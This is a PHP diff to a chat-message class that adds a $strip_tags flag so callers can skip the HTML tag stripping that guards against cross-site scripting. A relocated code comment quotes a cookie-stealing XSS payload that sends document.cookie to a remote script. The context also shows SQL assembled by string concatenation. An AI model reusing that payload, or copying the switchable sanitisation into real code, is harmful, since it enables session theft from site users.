@@ -945,7 +945,7 @@ class cls_ssshout
 	}
 	
 	
-	public function insert_shout($latitude, $longitude, $your_name, $shouted, $whisper_to, $email, $ip, $bg, $layer, $typing = false, $ssshout_id = null, $phone = null, $local_msg_id = null, $whisper_site = null, $short_code = null, $public_to = null, $date_override = null,$loginas = true, $allow_plugins = true, $allowed_plugins = null, $notification = true, $always_send_email = false)
+	public function insert_shout($latitude, $longitude, $your_name, $shouted, $whisper_to, $email, $ip, $bg, $layer, $typing = false, $ssshout_id = null, $phone = null, $local_msg_id = null, $whisper_site = null, $short_code = null, $public_to = null, $date_override = null,$loginas = true, $allow_plugins = true, $allowed_plugins = null, $notification = true, $always_send_email = false, $strip_tags = true)
 	{
 	    global $msg;
 	    global $lang;
@@ -1114,7 +1114,7 @@ class cls_ssshout
 					   $status = "typing";
 					}
 					
-					list($ssshout_processed, $include_payment) = $this->process_chars($message,$ip,$user_id, $ssshout_id, $allow_plugins, $allowed_plugins);
+					list($ssshout_processed, $include_payment) = $this->process_chars($message,$ip,$user_id, $ssshout_id, $allow_plugins, $allowed_plugins, $strip_tags);
 					
 					$sql = "UPDATE tbl_ssshout SET date_when_shouted = " . clean_data($date_shouted) . ",
 												var_shouted = '" . clean_data($message) . "',
@@ -1147,7 +1147,7 @@ class cls_ssshout
 				} else {
 				
 					//Process the chars
-					list($ssshout_processed, $include_payment) = $this->process_chars($message,$ip,$user_id, null, $allow_plugins, $allowed_plugins);
+					list($ssshout_processed, $include_payment) = $this->process_chars($message,$ip,$user_id, null, $allow_plugins, $allowed_plugins, $strip_tags);
 				
 					if($typing == false) {
 					   $status = "final";
@@ -1211,7 +1211,7 @@ class cls_ssshout
 						
 						if($include_payment == true) {
 							//Includes payment need to process again with the message id
-							list($ssshout_processed, $include_payment) = $this->process_chars($message,$ip,$user_id,$message_id, $allow_plugins, $allowed_plugins);
+							list($ssshout_processed, $include_payment) = $this->process_chars($message,$ip,$user_id,$message_id, $allow_plugins, $allowed_plugins, $strip_tags);
 							$sql = "UPDATE tbl_ssshout SET 
 												var_shouted_processed = '" . clean_data_keep_tags($ssshout_processed) . "'
 												WHERE int_ssshout_id = " . $ssshout_id;
@@ -1318,7 +1318,7 @@ class cls_ssshout
 	}
 
 	
-	public function process_chars($my_line, $ip, $user_id, $id = null, $allow_plugins = true, $allowed_plugins = null)
+	public function process_chars($my_line, $ip, $user_id, $id = null, $allow_plugins = true, $allowed_plugins = null, $strip_tags = true)
 	{
 		$include_payment = false;
         $orig_line = $my_line;
@@ -1327,10 +1327,12 @@ class cls_ssshout
         global $root_server_url;
         global $cnf;
 		
-		//Handle cross site security E.g. user should not be able to enter "<img src="http://localhost/submitcookie.php?cookie =' + escape(document.cookie) + '" />"
-		//https://www.geeksforgeeks.org/cookie-tracking-stealing-using-cross-site-scripting/
-		//Remove any direct tags
-		$my_line = strip_tags($my_line, '<i>');
+		if($strip_tags == true) {
+			//Handle cross site security E.g. user should not be able to enter "<img src="http://localhost/submitcookie.php?cookie =' + escape(document.cookie) + '" />"
+			//https://www.geeksforgeeks.org/cookie-tracking-stealing-using-cross-site-scripting/
+			//Remove any direct tags
+			$my_line = strip_tags($my_line, '<i>');
+		}
 		
 		
 		//Handle any plugin-defined parsing of the message. Eg. turn smileys :) into smiley images.
